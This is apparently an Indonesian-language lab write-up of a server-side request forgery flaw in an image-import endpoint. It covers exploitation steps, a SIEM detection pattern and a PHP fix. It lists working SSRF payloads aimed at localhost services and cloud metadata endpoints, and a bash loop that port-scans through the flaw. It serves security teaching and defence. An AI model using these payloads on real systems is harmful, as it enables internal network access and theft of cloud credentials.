# SSRF — Server-Side Request Forgery

## Deskripsi
SSRF terjadi ketika server melakukan request ke URL yang ditentukan oleh attacker. Server bisa jadi proxy untuk mengakses resource internal yang tidak bisa diakses langsung dari luar (internal network, cloud metadata, localhost services).

**Severity:** High  
**OWASP:** A10:2021 — Server-Side Request Forgery

## Endpoint Vulnerable
- `POST /public/import_image.php` — field `image_url` di-curl tanpa whitelist

## Langkah Eksploitasi

### Basic SSRF — Akses localhost
```
POST /public/import_image.php
image_url=http://127.0.0.1:8081
```
→ Server mem-fetch phpMyAdmin yang berjalan di port 8081 (internal)

### Akses Internal Services
```
image_url=http://127.0.0.1:8080/admin/users.php
image_url=http://127.0.0.1:3306   (MySQL — mungkin error tapi terkonfirmasi port)
image_url=http://localhost/server-status  (Apache status page)
```

### Cloud Metadata (jika di cloud)
```
image_url=http://169.254.169.254/latest/meta-data/
image_url=http://metadata.google.internal/computeMetadata/v1/
```

### Port Scanning via SSRF
```bash
# Script iterasi port
for port in 22 80 443 3306 5432 6379 8080 8081; do
  curl -X POST http://localhost:8080/public/import_image.php \
       -d "image_url=http://127.0.0.1:$port" -v
done
```

## Expected Output
- Response dari internal service ter-fetch oleh server
- Content-Type dan HTTP code dari target internal terlihat di error message
- Untuk non-image content: error message "Content-Type: text/html" (SSRF terkonfirmasi)

## SIEM Alert
Rule: `SSRF` (Phase 2)  
Pattern: `127.0.0.1`, `localhost`, `0.0.0.0`, `169.254.*`, `::1` di parameter URL

## Cara Fix (Secure Mode)
```php
// Whitelist domain
$allowed_domains = ['cdn.example.com', 'images.tokopedia.com'];
$parsed = parse_url($image_url);
if (!in_array($parsed['host'], $allowed_domains)) {
    die('Domain tidak diizinkan');
}

// Atau: blokir IP private/loopback
$ip = gethostbyname($parsed['host']);
if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
    die('IP tidak diizinkan');
}
```

## Attack Chain
- **SSRF + Internal Admin**: Akses /admin/users.php via SSRF → bypass auth
- **SSRF + Cloud Metadata**: Ambil credentials IAM dari metadata endpoint
